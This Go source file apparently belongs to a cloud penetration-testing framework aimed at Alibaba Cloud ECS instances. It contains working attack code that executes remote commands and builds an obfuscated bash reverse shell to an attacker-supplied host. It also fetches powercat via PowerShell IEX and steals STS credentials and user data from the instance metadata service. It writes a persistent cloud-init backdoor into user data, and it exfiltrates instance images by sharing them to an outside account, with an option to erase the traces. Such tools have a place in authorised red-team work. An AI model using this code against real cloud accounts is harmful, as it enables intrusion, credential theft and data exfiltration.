package aliecs

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/AlecAivazis/survey/v2"

	"github.com/teamssix/cf/pkg/util/errutil"

	"github.com/teamssix/cf/pkg/util/cmdutil"

	"github.com/aliyun/alibaba-cloud-sdk-go/services/ecs"
	"github.com/gookit/color"
	log "github.com/sirupsen/logrus"
)

var timeSleepSum int

func CreateCommand(region string, OSType string, command string, scriptType string) string {
	request := ecs.CreateCreateCommandRequest()
	request.Scheme = "https"
	request.Name = strconv.FormatInt(time.Now().Unix(), 10)
	if scriptType == "auto" {
		if OSType == "linux" {
			request.Type = "RunShellScript"
		} else {
			request.Type = "RunBatScript"
		}
	} else if scriptType == "sh" {
		request.Type = "RunShellScript"
	} else if scriptType == "bat" {
		request.Type = "RunBatScript"
	} else if scriptType == "ps" {
		request.Type = "RunPowerShellScript"
	}
	log.Debugln("执行命令 (Execute command): \n" + command)
	request.CommandContent = base64.StdEncoding.EncodeToString([]byte(command))
	response, err := ECSClient(region).CreateCommand(request)
	errutil.HandleErr(err)
	CommandId := response.CommandId
	log.Debugln("得到 CommandId 为 (CommandId value): " + CommandId)
	return CommandId
}

func DeleteCommand(region string, CommandId string) {
	request := ecs.CreateDeleteCommandRequest()
	request.Scheme = "https"
	request.CommandId = CommandId
	_, err := ECSClient(region).DeleteCommand(request)
	errutil.HandleErr(err)
	log.Debugln("删除 CommandId (Delete CommandId): " + CommandId)
}

func InvokeCommand(region string, OSType string, command string, scriptType string, specifiedInstanceID string) (string, string) {
	CommandId := CreateCommand(region, OSType, command, scriptType)
	request := ecs.CreateInvokeCommandRequest()
	request.Scheme = "https"
	request.CommandId = CommandId
	request.InstanceId = &[]string{specifiedInstanceID}
	response, err := ECSClient(region).InvokeCommand(request)
	errutil.HandleErr(err)
	InvokeId := response.InvokeId
	log.Debugln("得到 InvokeId 为 (InvokeId value): " + InvokeId)
	return CommandId, InvokeId
}

func DescribeInvocationResults(region string, CommandId string, InvokeId string, timeOut int) string {
	var output string
	timeSleep := 2
	timeSleepSum = timeSleepSum + timeSleep
	time.Sleep(time.Duration(timeSleep) * time.Second)
	request := ecs.CreateDescribeInvocationResultsRequest()
	request.Scheme = "https"
	request.InvokeId = InvokeId
	response, err := ECSClient(region).DescribeInvocationResults(request)
	errutil.HandleErr(err)
	InvokeRecordStatus := response.Invocation.InvocationResults.InvocationResult[0].InvokeRecordStatus
	if InvokeRecordStatus == "Finished" {
		output = response.Invocation.InvocationResults.InvocationResult[0].Output
		log.Debugln("命令执行结果 base64 编码值为 (The base64 encoded value of the command execution result is):\n" + output)
		DeleteCommand(region, CommandId)
	} else {
		if timeSleepSum > timeOut {
			log.Warnf("命令执行超时，如果想再次执行可以使用 -t 或 --timeOut 参数指定命令等待时间 (If you want to execute the command again, you can use the -t or --timeOut parameter to specify the waiting time)")
			os.Exit(0)
		} else {
			log.Debugf("命令执行结果为 %s，等待 %d 秒钟后再试 (Command execution result is %s, wait for %d seconds and try again)", InvokeRecordStatus, timeSleep, InvokeRecordStatus, timeSleep)
			output = DescribeInvocationResults(region, CommandId, InvokeId, timeOut)
		}
	}
	return output
}

func ECSExec(command string, commandFile string, scriptType string, specifiedInstanceID string, region string, batchCommand bool, userData bool, metaDataSTSToken bool, ecsFlushCache bool, lhost string, lport string, timeOut int, ecsExecAllRegions bool, userDataBackdoor string, imageHijack string) {
	var InstancesList []Instances
	if ecsFlushCache == false {
		data := cmdutil.ReadECSCache("alibaba")
		for _, v := range data {
			switch {
			case specifiedInstanceID != "all" && region != "all":
				if specifiedInstanceID == v.InstanceId && region == v.RegionId {
					obj := Instances{
						InstanceId:       v.InstanceId,
						InstanceName:     v.InstanceName,
						OSName:           v.OSName,
						OSType:           v.OSType,
						Status:           v.Status,
						PrivateIpAddress: v.PrivateIpAddress,
						PublicIpAddress:  v.PublicIpAddress,
						RegionId:         v.RegionId,
					}
					InstancesList = append(InstancesList, obj)
				}
			case specifiedInstanceID != "all" && region == "all":
				if specifiedInstanceID == v.InstanceId {
					obj := Instances{
						InstanceId:       v.InstanceId,
						InstanceName:     v.InstanceName,
						OSName:           v.OSName,
						OSType:           v.OSType,
						Status:           v.Status,
						PrivateIpAddress: v.PrivateIpAddress,
						PublicIpAddress:  v.PublicIpAddress,
						RegionId:         v.RegionId,
					}
					InstancesList = append(InstancesList, obj)
				}
			case specifiedInstanceID == "all" && region != "all":
				if region == v.RegionId {
					obj := Instances{
						InstanceId:       v.InstanceId,
						InstanceName:     v.InstanceName,
						OSName:           v.OSName,
						OSType:           v.OSType,
						Status:           v.Status,
						PrivateIpAddress: v.PrivateIpAddress,
						PublicIpAddress:  v.PublicIpAddress,
						RegionId:         v.RegionId,
					}
					InstancesList = append(InstancesList, obj)
				}
			case specifiedInstanceID == "all" && region == "all":
				obj := Instances{
					InstanceId:       v.InstanceId,
					InstanceName:     v.InstanceName,
					OSName:           v.OSName,
					OSType:           v.OSType,
					Status:           v.Status,
					PrivateIpAddress: v.PrivateIpAddress,
					PublicIpAddress:  v.PublicIpAddress,
					RegionId:         v.RegionId,
				}
				InstancesList = append(InstancesList, obj)
			}
		}
	} else {
		InstancesList = ReturnInstancesList(region, false, specifiedInstanceID, ecsExecAllRegions)
	}
	if len(InstancesList) == 0 {
		if specifiedInstanceID == "all" {
			log.Warnf("未发现实例，可以使用 --flushCache 刷新缓存后再试 (No instances found, You can use the --flushCache command to flush the cache and try again)")
		} else {
			log.Warnf("未找到 %s 实例的相关信息 (No information found about the %s instance)", specifiedInstanceID, specifiedInstanceID)
		}
	} else {
		if specifiedInstanceID == "all" {
			var (
				selectInstanceIDList []string
				selectInstanceID     string
			)
			selectInstanceIDList = append(selectInstanceIDList, "全部实例 (all instances)")
			for _, i := range InstancesList {
				selectInstanceIDList = append(selectInstanceIDList, fmt.Sprintf("%s (%s)", i.InstanceId, i.OSName))
			}
			sort.Strings(selectInstanceIDList)
			prompt := &survey.Select{
				Message: "选择一个实例 (Choose a instance): ",
				Options: selectInstanceIDList,
			}
			survey.AskOne(prompt, &selectInstanceID)
			for _, j := range InstancesList {
				if selectInstanceID != "all" {
					if selectInstanceID == fmt.Sprintf("%s (%s)", j.InstanceId, j.OSName) {
						InstancesList = nil
						InstancesList = append(InstancesList, j)
					}
				}
			}
		}
		var num = 0
		for _, i := range InstancesList {
			specifiedInstanceID := i.InstanceId
			if userDataBackdoor != "" {
				UserDataBackdoor(i.RegionId, userDataBackdoor, specifiedInstanceID, timeOut, scriptType, i.OSType)
			} else if imageHijack !="" {
				var isSure string
				prompt := &survey.Input{
			        Message: "警告：使用该攻击手法，会在目标账户上新建一个快照和镜像，本程序在攻击成功后提供删除功能。\n但如果因为意外情况导致快照或镜像残留在目标，有可能导致目标阿里云账户造成不必要支出。\n如果你已明确并确认要使用此攻击手法，请键入Yes，键入其他单词将退出此功能 \n(Warning: Using this attack method, a snapshot and mirror will be created on the target account. This program provides deletion function after successful attack. However, if the snapshot or mirror remains on the target due to unexpected circumstances, unnecessary expenses may be caused to the target Ali Cloud account. If you have specified and confirmed that you want to use this attack, type Yes.Any other words will exit this feature)",
			    }
			    survey.AskOne(prompt, &isSure)
			    if isSure == "Yes" {
			    	ImageHijack(i.RegionId, imageHijack, specifiedInstanceID, timeOut)
			    }
			}else if i.Status == "Running" {
				num = num + 1
				InstanceName := i.InstanceName
				region := i.RegionId
				OSType := i.OSType
				if userData == true {
					commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut)
					if commandResult == "" {
						fmt.Println("未找到用户数据 (User data not found)")
					} else if commandResult == "disabled" {
						fmt.Println("该实例禁止访问用户数据 (This instance disables access to user data)")
					} else {
						fmt.Println(commandResult)
					}
				} else if metaDataSTSToken == true {
					commandResult := getMetaDataSTSToken(region, OSType, scriptType, specifiedInstanceID, timeOut)
					if commandResult == "" {
						fmt.Println("未找到临时访问密钥 (STS Token not found)")
					} else if commandResult == "disabled" {
						fmt.Println("该实例禁止访问临时凭证 (This instance disables access to STS Token)")
					} else {
						fmt.Println(commandResult)
					}
				} else {
					if batchCommand == true {
						if OSType == "linux" {
							command = "whoami && id && hostname && ifconfig"
						} else {
							command = "whoami && hostname && ipconfig"
						}
					} else if lhost != "" {
						if OSType == "linux" {
							revShell := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
							command = fmt.Sprintf("bash -c '{echo,%s}|{base64,-d}|{bash,-i}'", base64.StdEncoding.EncodeToString([]byte(revShell)))
						} else {
							command = fmt.Sprintf("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c %s -p %s -e cmd", lhost, lport)
						}
					} else if commandFile != "" {
						file, err := os.Open(commandFile)
						errutil.HandleErr(err)
						defer file.Close()
						contentByte, err := ioutil.ReadAll(file)
						errutil.HandleErr(err)
						content := string(contentByte)
						command = content[:len(content)-1]
					}
					if len(InstancesList) == 1 {
						color.Printf("\n<lightGreen>%s (%s) ></> %s\n\n", specifiedInstanceID, InstanceName, command)
					} else {
						color.Printf("\n<lightGreen>%d %s (%s) ></> %s\n\n", num, specifiedInstanceID, InstanceName, command)
					}
					commandResult := getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
					fmt.Println(commandResult)
				}
			}
		}
	}
}

func getExecResult(region string, command string, OSType string, scriptType string, specifiedInstanceID string, timeOut int) string {
	CommandId, InvokeId := InvokeCommand(region, OSType, command, scriptType, specifiedInstanceID)
	output := DescribeInvocationResults(region, CommandId, InvokeId, timeOut)
	var commandResult string
	if output == "DQo=" {
		commandResult = ""
	} else {
		commandResultByte, err := base64.StdEncoding.DecodeString(output)
		errutil.HandleErr(err)
		commandResult = string(commandResultByte)
	}
	return commandResult
}

func getUserData(region string, OSType string, scriptType string, specifiedInstanceID string, timeOut int) string {
	var command string
	if OSType == "linux" {
		command = "curl -s http://100.100.100.200/latest/user-data/"
	} else {
		command = "Invoke-RestMethod http://100.100.100.200/latest/user-data/"
		scriptType = "ps"
	}
	commandResult := getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
	if strings.Contains(commandResult, "403 - Forbidden") {
		log.Debugln("元数据访问模式可能被设置成了加固模式，尝试获取 Token 访问 (The metadata access mode may have been set to hardened mode and is trying to get Token access)")
		if OSType == "linux" {
			command = "TOKEN=`curl -s -X PUT \"http://100.100.100.200/latest/api/token\" -H \"X-aliyun-ecs-metadata-token-ttl-seconds: 21600\"` && curl -s -H \"X-aliyun-ecs-metadata-token: $TOKEN\" http://100.100.100.200/latest/user-data/"
		} else {
			command = "$token = Invoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token-ttl-seconds\" = \"21600\"} -Method PUT –Uri http://100.100.100.200/latest/api/token\nInvoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token\" = $token} -Method GET -Uri http://100.100.100.200/latest/user-data/"
			scriptType = "ps"
		}
		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
		if strings.Contains(commandResult, "404 - Not Found") || strings.Contains(commandResult, "403 - Forbidden") {
			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
			commandResult = "disabled"
		}
	} else if strings.Contains(commandResult, "404 - Not Found") {
		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
		commandResult = ""
	} else {
		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
	}
	return commandResult
}

func getMetaDataSTSToken(region string, OSType string, scriptType string, specifiedInstanceID string, timeOut int) string {
	var command string
	var commandResult string
	if OSType == "linux" {
		command = "curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/"
	} else {
		command = "Invoke-RestMethod http://100.100.100.200/latest/meta-data/ram/security-credentials/"
		scriptType = "ps"
	}
	roleName := getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)

	if strings.Contains(roleName, "403 - Forbidden") {
		log.Debugln("元数据访问模式可能被设置成了加固模式，尝试获取 Token 访问 (The metadata access mode may have been set to hardened mode and is trying to get Token access)")
		if OSType == "linux" {
			command = "TOKEN=`curl -s -X PUT \"http://100.100.100.200/latest/api/token\" -H \"X-aliyun-ecs-metadata-token-ttl-seconds: 21600\"` && curl -s -H \"X-aliyun-ecs-metadata-token: $TOKEN\" http://100.100.100.200/latest/meta-data/ram/security-credentials/"
		} else {
			command = "$token = Invoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token-ttl-seconds\" = \"21600\"} -Method PUT –Uri http://100.100.100.200/latest/api/token\nInvoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token\" = $token} -Method GET -Uri http://100.100.100.200/latest/meta-data/ram/security-credentials/"
			scriptType = "ps"
		}
		roleName = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
		if strings.Contains(roleName, "404 - Not Found") || strings.Contains(roleName, "403 - Forbidden") {
			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
			commandResult = "disabled"
		} else {
			if OSType == "linux" {
				command = "curl -s -H \"X-aliyun-ecs-metadata-token: $TOKEN\" http://100.100.100.200/latest/meta-data/ram/security-credentials/" + roleName
			} else {
				command = "Invoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token\" = $token} -Method GET -Uri http://100.100.100.200/latest/meta-data/ram/security-credentials/" + roleName
				scriptType = "ps"
			}
			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
			commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
		}
	} else if strings.Contains(roleName, "404 - Not Found") {
		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
		commandResult = ""
	} else {
		if OSType == "linux" {
			command = "curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/" + roleName
		} else {
			command = "Invoke-RestMethod http://100.100.100.200/latest/meta-data/ram/security-credentials/" + roleName
			scriptType = "ps"
		}
		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceID, command)
		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceID, timeOut)
	}
	return commandResult
}

func UserDataBackdoor(region string, command string, specifiedInstanceID string, timeOut int, scriptType string, OSType string) {
	request := ecs.CreateModifyInstanceAttributeRequest()
	request.Scheme = "https"
	request.InstanceId = specifiedInstanceID
	userdata, _ := base64.StdEncoding.DecodeString("I2Nsb3VkLWNvbmZpZwpib290Y21kOgogIC0g")
	userdataStr := string(userdata)
	userdataStr = fmt.Sprintf("%s%s", userdataStr, command)
	userdataStr = base64.StdEncoding.EncodeToString([]byte(userdataStr))
	request.UserData = userdataStr
	response, err := ECSClient(region).ModifyInstanceAttribute(request)
	errutil.HandleErr(err)
	commandResult := response.GetHttpStatus()
	if commandResult == 200 {
		fmt.Println("执行成功，正在查询userdata值 (The execution is successful, and the userdata value is being queried)")
		commandResult := getUserData(region, OSType, scriptType, specifiedInstanceID, timeOut )
		fmt.Println(commandResult)
		fmt.Println("如需使后门立即生效，请重启目标服务器 (For the backdoor to take effect immediately, please restart the target instance)")
	} else {
		fmt.Println("写入失败，请确认是否有 ModifyInstanceAttribute 权限 (Failed to write, please confirm whether you have the ModifyInstanceAttribute permission)")
	}
}

func ImageHijack(region string, aliyunAccount string, specifiedInstanceID string, timeOut int) {
	createImageRequest := ecs.CreateCreateImageRequest()
	createImageRequest.Scheme = "https"
	createImageRequest.InstanceId = specifiedInstanceID
	createImageRequest.QueryParams["Tag.1.value"] = "hack"
	createImageRequest.QueryParams["Tag.1.Key"] = "hack"
	createImageResponse, err := ECSClient(region).CreateImage(createImageRequest)
	if err != nil {
		fmt.Println("创建失败，请确认是否有 CreateImage 权限 (Creation failed, Please check whether you have the CreateImage permission)")
		return
	}

	imageId := createImageResponse.ImageId
	describeImagesRequest := ecs.CreateDescribeImagesRequest()
	describeImagesRequest.Scheme = "https"
	describeImagesRequest.ImageOwnerAlias = "self"
	describeImagesRequest.QueryParams["waiter"] = "expr='Images.Image[0].Status' to=Available"
	describeImagesRequest.QueryParams["output"] = "cols=ImageId,Tags.Tag[0].TagValue,Status rows=Images.Image[]"

	fmt.Println("正在创建目标实例镜像，请耐心等待 (The target instance image is being created. Please wait...)")
	for {
		describeImagesResponse, _ := ECSClient(region).DescribeImages(describeImagesRequest)

		if len(describeImagesResponse.Images.Image) > 0 && string(describeImagesResponse.Images.Image[0].Tags.Tag[0].TagValue) == "hack" {
			fmt.Println("创建完成,正在劫持此镜像到指定阿里云账户中 (Creating complete, hijacking this image to the specified Aliyun account)")
			break
		}

		time.Sleep(10 * time.Second)
	}


	modifyImageSharePermissionRequest := ecs.CreateModifyImageSharePermissionRequest()
	modifyImageSharePermissionRequest.Scheme = "https"
	modifyImageSharePermissionRequest.ImageId = imageId
	modifyImageSharePermissionRequest.QueryParams["AddAccount.1"] = aliyunAccount
	_, err = ECSClient(region).ModifyImageSharePermission(modifyImageSharePermissionRequest)
	if err != nil {
		fmt.Println("劫持失败，请确认是否有 ModifyImageSharePermission 权限 (Hijack failed, please confirm whether there are ModifyImageSharePermission permissions)")
		return
	}

	fmt.Println("劫持成功，请查看对应阿里云帐号的共享镜像")

	cleanImage := []string{"Yes", "No"}
	var cleanImageChoose string
    prompt := &survey.Select{
        Message: "是否进行清理痕迹？注意，清理后共享镜像将会被立刻删除 (Are traces cleaned? Note that the shared image will be deleted immediately after clearing)",
        Options: cleanImage,
    }
    survey.AskOne(prompt, &cleanImageChoose)
    if cleanImageChoose == "Yes" {
    	modifyImageSharePermissionRequest.QueryParams["RemoveAccount.1"] = aliyunAccount
    	ECSClient(region).ModifyImageSharePermission(modifyImageSharePermissionRequest)

    	deleteImageRequest := ecs.CreateDeleteImageRequest()
		deleteImageRequest.ImageId = imageId
		deleteImageRequest.QueryParams["Force"] = "true"	
		_, err = ECSClient(region).DeleteImage(deleteImageRequest)
		errutil.HandleErr(err)

		describeSnapshotsRequest := ecs.CreateDescribeSnapshotsRequest()
		describeSnapshotsRequest.InstanceId = specifiedInstanceID
		describeSnapshotsRequest.SnapshotType = "user"
		describeSnapshotsRequest.QueryParams["output"] = "cols=SnapshotName,SnapshotId,LastModifiedTime rows=Snapshots.Snapshot[]"
		describeSnapshotsResponse, err := ECSClient(region).DescribeSnapshots(describeSnapshotsRequest)
		errutil.HandleErr(err)

		var lastModifiedTime time.Time
		var snapShotId string
		for _, snapshot := range describeSnapshotsResponse.Snapshots.Snapshot {
	        snapshotTime, _ := time.Parse(time.RFC3339, snapshot.LastModifiedTime)
	        if snapshotTime.After(lastModifiedTime) {
	            lastModifiedTime = snapshotTime
	            snapShotId = snapshot.SnapshotId
	        }
	    }

		deleteSnapshotRequest := ecs.CreateDeleteSnapshotRequest()
		deleteSnapshotRequest.SnapshotId = snapShotId
		ECSClient(region).DeleteSnapshot(deleteSnapshotRequest)
		fmt.Println("清理完成")
    }
}